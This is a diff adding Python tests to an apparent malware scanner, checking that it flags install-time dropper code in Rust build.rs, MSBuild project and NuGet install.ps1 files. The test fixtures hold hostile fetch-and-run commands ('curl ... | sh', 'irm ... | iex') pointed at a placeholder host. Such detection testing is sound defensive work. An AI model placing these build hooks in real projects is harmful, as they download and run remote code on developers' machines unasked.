@@ -14086,3 +14086,47 @@ class TestHostileArchivesAndEncodings:
             encoding="utf-8",
         )
         assert self._rules(tmp_path).get("MALWARE.DROPPER.001") == "CRITICAL"
+
+
+class TestInstallTimeCodeInEveryEcosystem:
+    URL: ClassVar[str] = "https://x.invalid/p"
+
+    @staticmethod
+    def _rules(tmp_path, files: dict[str, str]) -> dict[str, str]:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        for name, body in files.items():
+            target = tmp_path / name
+            target.parent.mkdir(parents=True, exist_ok=True)
+            target.write_text(body, encoding="utf-8")
+        return {
+            f.rule_id: f.severity.name
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+        }
+
+    def test_a_build_rs_running_a_download(self, tmp_path) -> None:
+        build = (
+            'use std::process::Command;\nfn main() {\n    Command::new("sh")\n        .arg("-c")\n'
+            f'        .arg("curl -s {self.URL} | sh")\n        .status()\n        .unwrap();\n}}\n'
+        )
+        found = self._rules(tmp_path, {"Cargo.toml": '[package]\nname = "x"\n', "build.rs": build})
+        assert found.get("MALWARE.DROPPER.001") == "CRITICAL"
+
+    def test_an_msbuild_exec_task(self, tmp_path) -> None:
+        project = (
+            '<Project Sdk="Microsoft.NET.Sdk"><Target Name="P" BeforeTargets="Build">'
+            f'<Exec Command="powershell -c &quot;irm {self.URL} | iex&quot;" /></Target></Project>\n'
+        )
+        assert "DROPPER" in " ".join(self._rules(tmp_path, {"x.csproj": project}))
+
+    def test_a_nuget_install_script_is_a_hook_only_in_a_package(self, tmp_path) -> None:
+        script = f"irm {self.URL} | iex\r\n"
+        package = self._rules(
+            tmp_path / "pkg", {"x.nuspec": "<package/>", "tools/install.ps1": script}
+        )
+        repository = self._rules(tmp_path / "repo", {"tools/install.ps1": script})
+        assert package.get("MALWARE.DROPPER.001") == "CRITICAL"
+        assert "MALWARE.DROPPER.001" not in repository
